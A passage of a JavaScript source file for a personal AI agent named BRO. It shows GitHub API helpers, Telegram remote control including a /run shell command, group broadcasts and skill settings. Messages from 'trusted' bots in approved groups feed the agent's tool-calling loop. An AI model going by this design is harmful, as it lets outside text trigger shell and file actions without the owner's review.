  if(!/^[\w.-]+\/[\w.-]+$/.test(r)) throw new Error("Expected OWNER/REPO, got \""+r+"\"");
  return r;
}
async function ghApi(path){
  var headers = { "Accept": "application/vnd.github+json", "User-Agent": "builderBRO" };
  if (GITHUB_TOKEN) headers["Authorization"] = "Bearer " + GITHUB_TOKEN;
  var r = await fetch("https://api.github.com"+path, { headers: headers, signal: AbortSignal.timeout(15000) });
  if (r.status === 404) throw new Error("Not found (404) - check the repo name, and if it's private, that GITHUB_TOKEN has access.");
  if (r.status === 403 && r.headers.get("x-ratelimit-remaining") === "0") {
    var resetAt = r.headers.get("x-ratelimit-reset");
    var resetMsg = "";
    if (resetAt) {
      var secsUntil = Math.max(0, Math.floor(parseInt(resetAt) - Date.now()/1000));
      resetMsg = " Resets in " + (secsUntil<60?secsUntil+"s":Math.ceil(secsUntil/60)+"m") + ".";
    }
    throw new Error("GitHub rate limit hit."+resetMsg+(GITHUB_TOKEN?"":" Set GITHUB_TOKEN to raise the limit from 60/hr to 5000/hr."));
  }
  if (r.status === 401 || r.status === 403) throw new Error("GitHub auth error ("+r.status+") - check GITHUB_TOKEN is set and has repo access.");
  if (!r.ok) throw new Error("GitHub API error: "+r.status+" - "+(await r.text()).substring(0,300));
  return r.json();
}
async function ghRepoInfo(repo){
  var full = ghResolveRepo(repo);
  var d = await ghApi("/repos/"+full);
  return { full_name:d.full_name, description:d.description, stars:d.stargazers_count, forks:d.forks_count, open_issues:d.open_issues_count, default_branch:d.default_branch, private:d.private, pushed_at:d.pushed_at, html_url:d.html_url };
}
async function ghPRs(repo, state){
  var full = ghResolveRepo(repo);
  var d = await ghApi("/repos/"+full+"/pulls?state="+(state||"open")+"&per_page=15");
  return d.map(function(pr){ return { number:pr.number, title:pr.title, user:pr.user&&pr.user.login, state:pr.state, draft:pr.draft, updated_at:pr.updated_at, html_url:pr.html_url }; });
}
async function ghIssues(repo, state){
  var full = ghResolveRepo(repo);
  var d = await ghApi("/repos/"+full+"/issues?state="+(state||"open")+"&per_page=15");
  return d.filter(function(i){return !i.pull_request;}).map(function(i){ return { number:i.number, title:i.title, user:i.user&&i.user.login, state:i.state, updated_at:i.updated_at, html_url:i.html_url }; });
}
async function ghChecks(repo, ref){
  var full = ghResolveRepo(repo);
  var r = ref;
  if(!r){ var info = await ghApi("/repos/"+full); r = info.default_branch; }
  var d = await ghApi("/repos/"+full+"/commits/"+r+"/check-runs");
  return (d.check_runs||[]).map(function(c){ return { name:c.name, status:c.status, conclusion:c.conclusion, html_url:c.html_url }; });
}
async function ghFile(repo, path){
  var full = ghResolveRepo(repo);
  var clean = (path||"").trim().replace(/^\/+/,"").replace(/\/+$/,"");
  var isRoot = !clean || clean === ".";
  var d = await ghApi("/repos/"+full+"/contents"+(isRoot?"":"/"+clean));
  if (Array.isArray(d)) return "DIR: " + d.map(function(f){return f.type+" "+f.name;}).join("\n");
  if (d.encoding !== "base64") throw new Error("Unexpected encoding: "+d.encoding);
  return Buffer.from(d.content, "base64").toString("utf8");
}

async function tgSendTo(chatId, text, opts) {
  if (!tgConfig.botToken) return false;
  tgBase = "https://api.telegram.org/bot" + tgConfig.botToken;
  opts = opts || {};
  try {
    // Telegram max message = 4096 chars
    var chunks = [];
    if (text.length <= 4000) { chunks.push(text); }
    else {
      for (var i = 0; i < text.length; i += 4000) {
        chunks.push(text.substring(i, i + 4000));
      }
    }
    for (var ci = 0; ci < chunks.length; ci++) {
      var res = await fetch(tgBase + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: chunks[ci],
          parse_mode: opts.html ? "HTML" : undefined
        }),
        signal: AbortSignal.timeout(10000)
      });
      if(!res.ok) return false;
    }
    return true;
  } catch (e) {
    lg("TG send error: " + e.message);
    return false;
  }
}

async function tgSend(text, opts) {
  if (!tgConfig.chatId) return false;
  return tgSendTo(tgConfig.chatId, text, opts);
}

// Sends to every APPROVED group/supergroup/channel BRO's bot has seen.
// Returns {sent:[...], failed:[...]}. Does not touch the private admin chat (tgConfig.chatId) - use tgSend for that.
async function tgBroadcast(text, opts){
  var targets = Object.values(tgGroups).filter(function(g){ return g.approved; });
  var result = { sent: [], failed: [] };
  for (var i=0;i<targets.length;i++){
    var g = targets[i];
    var ok = await tgSendTo(g.id, text, opts);
    if(ok) result.sent.push(g.title); else result.failed.push(g.title);
  }
  return result;
}

async function tgNotify(msg) {
  if (!tgConfig.enabled || !tgConfig.notifications) return;
  await tgSend("\u{1F6E0}\uFE0F BRO: " + msg);
}

// Conversational reply loop for trusted senders (e.g. another bot like ESMA) posting
// in an approved group. Distinct from tgProcessMessage: this replies to the group the
// message came from (not your private admin chat), and only exposes natural AI
// conversation + tool-calling - not the full command palette (/run, /task, /stop, etc)
// which stays restricted to your private chat.
async function tgProcessGroupMessage(text, chatId, senderLabel){
  lg("TG group [" + senderLabel + "]: " + text);
  if (typeof memorize === "function") memorize("observation", "TG group (" + senderLabel + "): " + text.substring(0, 200), { from: "telegram_group", sender: senderLabel });

  var chatHistory = [{ role: "user", parts: [{ text: "[Message from " + senderLabel + " in a shared Telegram group]\n" + text }] }];
  var resp;
  try {
    resp = await askChat(chatHistory);
  } catch (e) {
    await tgSendTo(chatId, "\u274C Error: " + e.message);
    return;
  }
  var replyText = resp.content;
  chatHistory.push({ role: "model", parts: [{ text: replyText }] });

  var depth = 0;
  var failureSignatures = {};
  while (depth < MAX_DEPTH) {
    var calls = extractT(replyText);
    if (!calls.length) break;
    var results = await runT(calls);
    var repeatedFailure = false;
    results.forEach(function(r){
      if(r.result.startsWith("ERR")){
        var sig = r.tool+"::"+r.args.trim();
        failureSignatures[sig] = (failureSignatures[sig]||0) + 1;
        if(failureSignatures[sig] >= 2) repeatedFailure = true;
      }
    });
    var rpt = results.map(function(r){ return "[" + r.tool + "]: " + r.result; }).join("\n\n");
    chatHistory.push({ role: "user", parts: [{ text: "Results:\n" + rpt.substring(0, 20000) }] });
    depth++;
    if (depth >= MAX_DEPTH) break;
    if (repeatedFailure) break;
    try {
      resp = await askChat(chatHistory);
      replyText = resp.content;
      chatHistory.push({ role: "model", parts: [{ text: replyText }] });
    } catch (e) { break; }
  }

  var fin = cln(replyText);
  if (fin) await tgSendTo(chatId, fin.substring(0, 4000));
}

async function tgProcessMessage(text) {
  text = text.trim();
  if (!text) return;
  
  lg("TG incoming: " + text);
  if (typeof memorize === "function") memorize("observation", "Telegram: " + text.substring(0, 200), { from: "telegram" });
  
  // Direct commands
  if (text === "/status" || text === "/ping") {
    var upMin = Math.floor((Date.now() - startTime) / 60000);
    var msg = "\u{2699}\uFE0F BRO STATUS\n";
    msg += "Uptime: " + upMin + "m\n";
    msg += "CWD: " + process.cwd() + "\n";
    msg += "Session cmds: " + (broTimeState ? broTimeState.sessionCmds : stats.totalCmds) + "\n";
    msg += "Errors: " + stats.errors + "\n";
    msg += "Queue: " + (autopilot ? autopilot.queue.length : 0) + " tasks\n";
    msg += "Memory: " + (memory ? memory.total_interactions : 0) + " interactions";
    await tgSend(msg);
    return;
  }
  
  if (text === "/queue" || text === "/tasks") {
    if (!autopilot || !autopilot.queue.length) { await tgSend("\u{1F4ED} Queue empty"); return; }
    var msg = "\u{2699}\uFE0F QUEUE (" + autopilot.queue.length + ")\n";
    autopilot.queue.forEach(function(t) {
      msg += (t.status === "running" ? "\u{25B6}" : "\u{25CB}") + " " + t.name + " [" + t.type + "]\n";
    });
    await tgSend(msg);
    return;
  }
  
  if (text === "/memory") {
    if (!memory) { await tgSend("No memory loaded"); return; }
    var msg = "\u{1F9E0} MEMORY\n";
    msg += "Facts: " + memory.facts.length + "\n";
    msg += "Observations: " + memory.observations.length + "\n";
    msg += "Decisions: " + memory.decisions.length + "\n";
    msg += "Errors: " + memory.errors.length + "\n";
    msg += "Total: " + memory.total_interactions;
    await tgSend(msg);
    return;
  }
  
  if (text === "/approve") { await tgSend("Need: /approve ID (see /groups for IDs)"); return; }
  if (text === "/unapprove") { await tgSend("Need: /unapprove ID (see /groups for IDs)"); return; }
  if (text === "/broadcast") { await tgSend("Need: /broadcast MESSAGE"); return; }
  if (text === "/trust") { await tgSend("Need: /trust USERNAME_or_ID"); return; }
  if (text === "/untrust") { await tgSend("Need: /untrust USERNAME_or_ID"); return; }
  if (text === "/groups") {
    var gl = Object.values(tgGroups);
    if (!gl.length) { await tgSend("No groups discovered yet."); return; }
    var gmsg = "\u{1F4F1} KNOWN GROUPS\n\n";
    gl.sort(function(a,b){return b.lastSeen-a.lastSeen;}).forEach(function(g){
      gmsg += (g.approved ? "\u2714 " : "\u23F8 ") + g.title + " [" + g.type + "] id:" + g.id + "\n";
    });
    gmsg += "\n/approve ID or /unapprove ID";
    await tgSend(gmsg);
    return;
  }
  if (text.startsWith("/approve ")) {
    var agid = text.substring(9).trim();
    if (!tgGroups[agid]) { await tgSend("Unknown group id. See /groups."); return; }
    tgGroups[agid].approved = true; saveTgGroups();
    await tgSend("\u2714 Approved \"" + tgGroups[agid].title + "\" for broadcasts.");
    return;
  }
  if (text.startsWith("/unapprove ")) {
    var uagid = text.substring(11).trim();
    if (!tgGroups[uagid]) { await tgSend("Unknown group id. See /groups."); return; }
    tgGroups[uagid].approved = false; saveTgGroups();
    await tgSend("Revoked \"" + tgGroups[uagid].title + "\".");
    return;
  }
  if (text.startsWith("/broadcast ")) {
    var bmsg2 = text.substring(11).trim();
    if (!bmsg2) { await tgSend("Need: /broadcast MESSAGE"); return; }
    var bres2 = await tgBroadcast(bmsg2);
    if (!bres2.sent.length && !bres2.failed.length) { await tgSend("No approved groups. See /groups."); return; }
    var rmsg = "";
    if (bres2.sent.length) rmsg += "\u2714 Sent to: " + bres2.sent.join(", ") + "\n";
    if (bres2.failed.length) rmsg += "\u2718 Failed: " + bres2.failed.join(", ");
    await tgSend(rmsg.trim());
    return;
  }
  if (text.startsWith("/trust ")) {
    var tid = text.substring(7).trim().replace(/^@/, "");
    if (!tid) { await tgSend("Need: /trust USERNAME_or_ID"); return; }
    if (!tgConfig.trustedSenders.includes(tid)) { tgConfig.trustedSenders.push(tid); saveTgConfig(); }
    await tgSend("\u2714 Trusting \"" + tid + "\" in any approved group.");
    return;
  }
  if (text.startsWith("/untrust ")) {
    var utid = text.substring(9).trim().replace(/^@/, "");
    tgConfig.trustedSenders = tgConfig.trustedSenders.filter(function(t){ return t !== utid; });
    saveTgConfig();
    await tgSend("Untrusted \"" + utid + "\".");
    return;
  }
  if (text === "/trusted") {
    if (!tgConfig.trustedSenders.length) { await tgSend("No trusted senders yet. /trust USERNAME_or_ID to add one."); return; }
    await tgSend("\u{1F91D} TRUSTED SENDERS\n\n" + tgConfig.trustedSenders.join("\n"));
    return;
  }

  if (text === "/help") {
    var msg = "\u{1F91D} BRO TELEGRAM\n\n";
    msg += "/status - system status\n";
    msg += "/queue - autopilot tasks\n";
    msg += "/memory - memory stats\n";
    msg += "/thought - inspect thoughts\n";
    msg += "/dream - trigger dream\n";
    msg += "/git - git status\n";
    msg += "/run CMD - execute shell\n";
    msg += "/task NAME CMD - add autopilot task\n";
    msg += "/stop - stop autopilot\n";
    msg += "/notify on|off - toggle notifications\n";
    msg += "/groups - list known groups BRO is in\n";
    msg += "/approve ID / /unapprove ID - allow/revoke group broadcasts\n";
    msg += "/broadcast MSG - message all approved groups\n";
    msg += "/trust ID / /untrust ID - let a bot/user talk to BRO in approved groups\n";
    msg += "\nAnything else = ask BRO AI";
    await tgSend(msg);
    return;
  }
if (text === "/thought") {
    var msg = "\u{1F914} RECENT THOUGHTS\n\n";
    chatLog.slice(-5).forEach(function(entry) {
      var role = entry.role ? entry.role.toUpperCase() : "UNKNOWN";
      var content = typeof entry.content === 'string' ? entry.content : JSON.stringify(entry.content);
      var display = content.length > 100 ? content.substring(0, 100) + "..." : content;
      msg += "[" + role + "]: " + display + "\n\n";
    });
    await tgSend(msg);
    return;
  }

  
  if (text === "/dream") {
    if (typeof dreamCycle === "function") {
      var triggered = await dreamCycle(true);
      if (triggered.length) {
        var msg = "\u{1F319} DREAMS\n";
        triggered.forEach(function(d) { msg += d.icon + " " + d.title + "\n" + d.insight.substring(0, 200) + "\n\n"; });
        await tgSend(msg);
      } else { await tgSend("\u{1F319} No dream triggers. BRO is chill."); }
    }
    return;
  }
  
  if (text === "/git") {
    var result = TOOLS.exec("git status --short");
    var log = TOOLS.exec("git log --oneline -5");
    await tgSend("\u{1F4BB} GIT\n" + result + "\n\nRecent:\n" + log);
    return;
  }
  
  if (text.startsWith("/run ")) {
    var cmd = text.substring(5).trim();
    await tgSend("\u{26A1} Running: " + cmd);
    var result = TOOLS.exec(cmd);
    await tgSend("\u{1F4CB} Result:\n" + result.substring(0, 3500));
    return;
  }
  
  if (text.startsWith("/task ")) {
    var parts = text.substring(6).trim();
    var sp = parts.indexOf(" ");
    if (sp === -1) { await tgSend("Usage: /task NAME COMMAND"); return; }
    var nm = parts.substring(0, sp);
    var cm = parts.substring(sp + 1);
    if (typeof addTask === "function") {
      addTask(nm, cm);
      await tgSend("\u{2714}\uFE0F Queued: " + nm);
    }
    return;
  }
  
  if (text === "/stop") {
    if (typeof stopAutopilot === "function") stopAutopilot();
    await tgSend("\u{1F6D1} Autopilot stopped");
    return;
  }
  
  if (text === "/notify on") { tgConfig.notifications = true; saveTgConfig(); await tgSend("\u{1F514} Notifications ON"); return; }
  if (text === "/notify off") { tgConfig.notifications = false; saveTgConfig(); await tgSend("\u{1F515} Notifications OFF"); return; }
  
  // Default: send to AI agent
  await tgSend("\u{1F9E0} Thinking...");
  try {
    var memCtx = typeof buildMemoryContext === "function" ? buildMemoryContext() : "";
    var sysMsg = "You are BRO, responding via Telegram. Be concise. CWD: " + process.cwd() + "\n" + memCtx;
    var resp = await askChat([{ role: "user", parts: [{ text: sysMsg + "\n---\nUser: " + text }] }]);
    var reply = resp.content;
    
    // Execute any tool calls
    var calls = extractT(reply);
    if (calls.length) {
      var toolResults = await runT(calls);
      var cleaned = cln(reply);
      var toolReport = toolResults.map(function(r) {
        return (r.result.startsWith("ERR") ? "\u{274C}" : "\u{2714}\uFE0F") + " " + r.tool + ": " + r.result.substring(0, 500);
      }).join("\n\n");
      await tgSend((cleaned ? cleaned + "\n\n" : "") + toolReport);
    } else {
      await tgSend(reply.substring(0, 3500));
    }
    
    if (typeof memorize === "function") memorize("observation", "TG AI reply: " + reply.substring(0, 200), { from: "telegram" });
  } catch (e) {
    await tgSend("\u{274C} Error: " + e.message);
  }
}

async function tgPoll() {
  if (!tgConfig.botToken || !tgConfig.chatId) return;
  tgBase = "https://api.telegram.org/bot" + tgConfig.botToken;
  try {
    var r = await fetch(tgBase + "/getUpdates?offset=" + (tgConfig.lastUpdateId + 1) + "&timeout=1&allowed_updates=[%22message%22,%22my_chat_member%22]", {
      signal: AbortSignal.timeout(5000)
    });
    if (!r.ok) return;
    var d = await r.json();
    if (!d.ok || !d.result || !d.result.length) return;
    
    for (var i = 0; i < d.result.length; i++) {
      var update = d.result[i];
      tgConfig.lastUpdateId = update.update_id;

      // Bot added/removed/promoted in a group - the canonical way to discover groups,
      // fires even if nobody sends a message after adding the bot.
      if (update.my_chat_member && update.my_chat_member.chat) {
        registerTgChat(update.my_chat_member.chat, update.my_chat_member.new_chat_member && update.my_chat_member.new_chat_member.status);
      }

      if (update.message && update.message.chat) {
        // Any message from a group/supergroup/channel registers (or refreshes) it as a known broadcast target.
        if (update.message.chat.type !== "private") {
          registerTgChat(update.message.chat);
        }
        // Security: only the configured admin chat can issue commands / talk to the AI.
        if (String(update.message.chat.id) === String(tgConfig.chatId)) {
          var text = update.message.text || "";
          if (text) {
            // Show on local terminal too
            console.log(p("magenta", "\n  \u{1F4F1} TG: ") + p("dim", text));
            await tgProcessMessage(text);
          }
        } else if (update.message.chat.type !== "private") {
          // Group message from someone other than you. Only reply if the group is
          // approved AND the sender is explicitly trusted (e.g. ESMA's bot) - never
          // opens command execution up to arbitrary group members.
          var grpEntry = tgGroups[String(update.message.chat.id)];
          var senderUsername = update.message.from && update.message.from.username;
          var senderId = update.message.from && String(update.message.from.id);
          var isTrusted = (tgConfig.trustedSenders || []).some(function(t){
            return t === senderUsername || t === senderId;
          });
          var gtext = update.message.text || "";
          if (grpEntry && grpEntry.approved && isTrusted && gtext) {
            var label = senderUsername || senderId;
            console.log(p("magenta", "\n  \u{1F4F1} TG GROUP [" + label + "]: ") + p("dim", gtext));
            await tgProcessGroupMessage(gtext, update.message.chat.id, label);
          }
        }
      }
    }
    saveTgConfig();
  } catch (e) {
    // Silent fail â€” network might be down
  }
}

function startTelegram() {
  if (tgPollTimer) return;
  if (!tgConfig.botToken || !tgConfig.chatId) return;
  tgConfig.enabled = true;
  saveTgConfig();
  tgPollTimer = setInterval(tgPoll, tgConfig.pollInterval);
  tgSend("\u{1F91D} BRO connected. Type /help for commands.");
}

function stopTelegram() {
  if (tgPollTimer) { clearInterval(tgPollTimer); tgPollTimer = null; }
  tgConfig.enabled = false;
  saveTgConfig();
}

function trackCmd(cmd){stats.totalCmds++;stats.cmdFreq[cmd]=(stats.cmdFreq[cmd]||0)+1;saveStat();broTimeState.sessionCmds++;}

var SP2=["\u28CB","\u28D9","\u28F9","\u28F8","\u28FC","\u28F4","\u28E6","\u28E7","\u28C7","\u28CF"],stt=null,sii=0,spinQuipCtx=null,spinCurrentText="",spinQuipRefreshedAt=0;
function spin(m, quipCategory){
  sii=0;
  spinQuipCtx = quipCategory || null;
  spinCurrentText = spinQuipCtx ? broQuip(spinQuipCtx) : m;
  spinQuipRefreshedAt = Date.now();
  stt=setInterval(function(){
    if(spinQuipCtx && Date.now()-spinQuipRefreshedAt > 2500){
      spinCurrentText = broQuip(spinQuipCtx);
      spinQuipRefreshedAt = Date.now();
    }
    process.stdout.write("\r"+CL.cyan+SP2[sii++%SP2.length]+" "+spinCurrentText+CL.reset+"   ");
  },80);
}
function unspin(){if(stt){clearInterval(stt);stt=null;}spinQuipCtx=null;process.stdout.write("\r"+" ".repeat(60)+"\r");}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SKILLS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var defaultSkills=[
  {id:"shell",name:"Shell Execution",icon:"\u26A1",enabled:true,level:3,desc:"Run shell commands (PowerShell on Windows, sh elsewhere)",category:"core"},
  {id:"fileio",name:"File I/O",icon:"\u{1F4C4}",enabled:true,level:3,desc:"Read, write, patch files",category:"core"},
  {id:"search",name:"Code Search",icon:"\u{1F50D}",enabled:true,level:2,desc:"Find, grep across codebase",category:"core"},
  {id:"git",name:"Git Operations",icon:"\u{1F500}",enabled:true,level:2,desc:"Status, diff, commit, push",category:"devops"},
  {id:"deploy",name:"Deployment",icon:"\u{1F680}",enabled:true,level:1,desc:"Vercel deploys",category:"devops"},
  {id:"api",name:"API Integration",icon:"\u{1F310}",enabled:true,level:2,desc:"Tavily, Base44",category:"connect"},
  {id:"ai_review",name:"AI Code Review",icon:"\u{1F9E0}",enabled:true,level:2,desc:"Review, explain, refactor via LLM",category:"ai"},
  {id:"ai_gen",name:"AI Generation",icon:"\u2728",enabled:true,level:2,desc:"Generate code, docs, tests",category:"ai"},
  {id:"monitor",name:"System Monitor",icon:"\u{1F4CA}",enabled:true,level:1,desc:"Ports, processes, disk",category:"system"},
  {id:"security",name:"Security Audit",icon:"\u{1F6E1}\uFE0F",enabled:true,level:1,desc:"Scan for secrets",category:"security"},
  {id:"dream",name:"Dream Engine",icon:"\u{1F319}",enabled:true,level:3,desc:"Idle synthesis, patterns",category:"cognitive"},
  {id:"heartbeat",name:"Heartbeat",icon:"\u2764\uFE0F",enabled:true,level:2,desc:"API health tracking",category:"cognitive"},
  {id:"memory",name:"Memory",icon:"\u{1F4BE}",enabled:true,level:2,desc:"History, context, recall",category:"cognitive"},
  {id:"tg_broadcast",name:"Group Broadcast",icon:"\u{1F4E2}",enabled:true,level:2,desc:"Discover Telegram groups, message approved ones autonomously",category:"connect"}
];
var skills;try{skills=JSON.parse(readFileSync(SKILLS_F,"utf8"));}catch{skills=JSON.parse(JSON.stringify(defaultSkills));}
(function mergeNewDefaultSkills(){
  var known={};skills.forEach(function(s){known[s.id]=true;});
  var added=false;
  defaultSkills.forEach(function(d){if(!known[d.id]){skills.push(JSON.parse(JSON.stringify(d)));added=true;}});
  if(added)try{writeFileSync(SKILLS_F,JSON.stringify(skills,null,2),"utf8");}catch{}
})();
function saveSkills(){try{writeFileSync(SKILLS_F,JSON.stringify(skills,null,2),"utf8");}catch{}}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CUSTOM SKILLS (from /skills create) - previously write-only: skillsCreateWizard
// saved these to disk but nothing ever loaded them back or used them for
// anything. Now they're loaded at startup, shown/toggleable in /skills, and
// - when enabled - actually inject their custom prompt whenever their
// trigger keyword(s) appear in what you type.
var CUSTOM_SKILLS_F=join(DATA_DIR,"custom-skills.json");
var customSkills;try{customSkills=JSON.parse(readFileSync(CUSTOM_SKILLS_F,"utf8"));}catch{customSkills=[];}
function saveCustomSkills(){try{writeFileSync(CUSTOM_SKILLS_F,JSON.stringify(customSkills,null,2),"utf8");}catch{}}
function allSkills(){ return skills.concat(customSkills); }
// Returns the combined prompt text for every enabled custom skill whose
// trigger keyword appears (case-insensitive, substring match) in the input.
function matchCustomSkillPrompts(input){
  if(!input) return "";
  var lower = input.toLowerCase();
  var hits = customSkills.filter(function(s){
    return s.enabled && Array.isArray(s.triggers) && s.triggers.some(function(t){ return t && lower.includes(t.toLowerCase()); });
  });
  if(!hits.length) return "";
  return hits.map(function(s){ return "["+s.name+" skill active] "+s.prompt; }).join("\n");
}


// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// INTERACTIVE SELECTOR â€” arrow key navigation
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

async function interactiveSelect(items, opts) {
  opts = opts || {};
  var title = opts.title || "SELECT";
  var multi = opts.multi || false;
  var selected = new Set(opts.preSelected || []);
  var cursor = 0;
  var startRow = 3;
  var maxVisible = Math.min(items.length, H - 6);
  var scrollOffset = 0;
  
  // Save raw mode state and enable it
  if(!process.stdin.isTTY||typeof process.stdin.setRawMode!=="function"){
    console.log(p("red","  Interactive picker needs a real terminal (not available here)."));
    return null;
  }
  var wasRaw = process.stdin.isRaw;
  process.stdin.setRawMode(true);
  process.stdin.resume();
  
  function render() {
    wr(CLR);
    at(1, 3);
    wr(rgb(255,215,0) + BOLD + title + RST);
    at(2, 3);
    if (multi) {
      wr(rgb(100,100,120) + "[\u2191\u2193] move  [SPACE] toggle  [a] all  [n] none  [ENTER] confirm  [q] cancel" + RST);
    } else {
      wr(rgb(100,100,120) + "[\u2191\u2193] move  [ENTER] select  [q] cancel" + RST);
    }
    
    // Scroll window
    if (cursor < scrollOffset) scrollOffset = cursor;
    if (cursor >= scrollOffset + maxVisible) scrollOffset = cursor - maxVisible + 1;
    
    for (var i = 0; i < maxVisible; i++) {
      var idx = scrollOffset + i;
      if (idx >= items.length) break;
      var item = items[idx];
      var row = startRow + i;
      at(row, 3);
      
      var isCursor = idx === cursor;
      var isSelected = selected.has(idx);
      
      // Cursor indicator
      if (isCursor) {
        wr(rgb(255,215,0) + BOLD + " \u25B6 " + RST);
      } else {
        wr("   ");
      }
      
      // Checkbox for multi-select
      if (multi) {
        if (isSelected) {
          wr(rgb(0,255,100) + BOLD + "[\u2714] " + RST);
        } else {
          wr(rgb(80,80,100) + "[ ] " + RST);
        }
      }
      
      // Item display
      var icon = item.icon || "";
      var name = item.name || item.label || String(item);
      var desc = item.desc || "";
      var status = item.enabled !== undefined ? (item.enabled ? rgb(0,255,100) + "ON" : rgb(255,60,60) + "OFF") : "";
      var lvl = item.level ? (rgb(item.level>=3?0:item.level>=2?255:255, item.level>=3?255:item.level>=2?215:150, item.level>=3?100:0) + "\u2588".repeat(item.level) + rgb(60,60,60) + "\u2591".repeat(3-item.level)) : "";
      
      if (isCursor) {
        wr(rgb(255,255,255) + BOLD + icon + " " + name.padEnd(22) + RST + " " + status + RST + " " + lvl + RST + "  " + rgb(140,140,160) + desc.substring(0,40) + RST);
      } else {
        wr(rgb(160,160,180) + icon + " " + name.padEnd(22) + RST + " " + status + RST + " " + lvl + RST + "  " + rgb(80,80,100) + desc.substring(0,40) + RST);
      }
    }
    
    // Scroll indicators
    if (scrollOffset > 0) { at(startRow - 1, 5); wr(rgb(100,100,120) + "\u25B2 more" + RST); }
    if (scrollOffset + maxVisible < items.length) { at(startRow + maxVisible, 5); wr(rgb(100,100,120) + "\u25BC more" + RST); }
    
    // Footer
    at(startRow + maxVisible + 1, 3);
    if (multi) {
      wr(rgb(100,100,120) + selected.size + "/" + items.length + " selected" + RST);
    }
  }
  
  render();
  
  return new Promise(function(resolve) {
    function onKey(key) {
      var k = key.toString();
      var code2 = key.toString("hex");
      
      // Arrow up
      if (code2 === "1b5b41" || k === "k") {
        cursor = Math.max(0, cursor - 1);
        render();
        return;
      }
      // Arrow down
      if (code2 === "1b5b42" || k === "j") {
        cursor = Math.min(items.length - 1, cursor + 1);
        render();
        return;
      }
      // Space â€” toggle in multi mode
      if (k === " " && multi) {
        if (selected.has(cursor)) selected.delete(cursor);
        else selected.add(cursor);
        render();
        return;
      }
      // a â€” select all
      if (k === "a" && multi) {
        for (var i = 0; i < items.length; i++) selected.add(i);
        render();
        return;
      }
      // n â€” select none
      if (k === "n" && multi) {
        selected.clear();
        render();
        return;
      }
      // Enter â€” confirm
      if (k === "\r" || k === "\n") {
        process.stdin.removeListener("data", onKey);
        process.stdin.setRawMode(wasRaw || false);
        wr(CLR);
        if (multi) {
          resolve(Array.from(selected).map(function(i) { return items[i]; }));
        } else {
          resolve(items[cursor]);
        }
        return;
      }
      // q or Escape â€” cancel
      if (k === "q" || code2 === "1b") {
        process.stdin.removeListener("data", onKey);
        process.stdin.setRawMode(wasRaw || false);
        wr(CLR);
        resolve(null);
        return;
      }
      // Tab â€” toggle + move down
      if (k === "\t" && multi) {
        if (selected.has(cursor)) selected.delete(cursor);
        else selected.add(cursor);
        cursor = Math.min(items.length - 1, cursor + 1);
        render();
        return;
      }
      // Page up
      if (code2 === "1b5b357e") {
        cursor = Math.max(0, cursor - maxVisible);
        render();
        return;
      }
      // Page down
      if (code2 === "1b5b367e") {
        cursor = Math.min(items.length - 1, cursor + maxVisible);
        render();
        return;
      }
      // Home
      if (code2 === "1b5b48") { cursor = 0; render(); return; }
      // End
      if (code2 === "1b5b46") { cursor = items.length - 1; render(); return; }
    }
    process.stdin.on("data", onKey);
  });
}

function showSkillsDashboard(){
  var G=rgb(255,215,0);var P=rgb(180,0,255);var GR=rgb(0,255,100);var R=RST;var B=BOLD;
  console.log("\n"+G+B+"  \u2550\u2550\u2550 BRO SKILLS DASHBOARD \u2550\u2550\u2550"+R+"\n");
  var cats={core:"CORE",devops:"DEVOPS",connect:"CONNECT",ai:"AI",system:"SYSTEM",security:"SECURITY",cognitive:"COGNITIVE"};
  var lastCat="";
  skills.forEach(function(s){
    if(s.category!==lastCat){lastCat=s.category;console.log("  "+P+B+(cats[s.category]||s.category)+R);}
    var status=s.enabled?GR+"\u25CF ON "+R:rgb(255,0,0)+"\u25CB OFF"+R;
    var lvl="\u2588".repeat(s.level)+"\u2591".repeat(3-s.level);
    var lvlColor=s.level>=3?GR:s.level>=2?G:rgb(255,150,0);
    console.log("    "+s.icon+" "+p("cyan",s.name.padEnd(20))+status+"  "+lvlColor+lvl+R+"  "+p("dim",s.desc));
  });
  console.log("\n  "+p("dim","Toggle: /skills toggle ID | Level: /skills level ID N | Reset: /skills reset\n"));
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// HEARTBEAT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var heartbeat;try{heartbeat=JSON.parse(readFileSync(HEARTBEAT_F,"utf8"));}catch{heartbeat={checks:[],uptime:{},lastCheck:0};}
var ENDPOINTS=[
  {id:"base44",name:"Base44 API",url:"https://base44.app/api/apps/"+APP+"/agents/conversations",headers:{"Content-Type":"application/json","X-App-Id":APP,"Authorization":"Bearer "+TOKEN}},
  {id:"groq",name:"Groq LLM",url:"https://api.groq.com/openai/v1/models",headers:{"Authorization":"Bearer "+GROQ_KEY}}
];

async function runHeartbeat(silent){
  var results=[];
  if(!silent)console.log("");
  for(var i=0;i<ENDPOINTS.length;i++){
    var ep=ENDPOINTS[i];
    if(!silent)process.stdout.write("  "+p("dim","pinging "+ep.name+"..."));
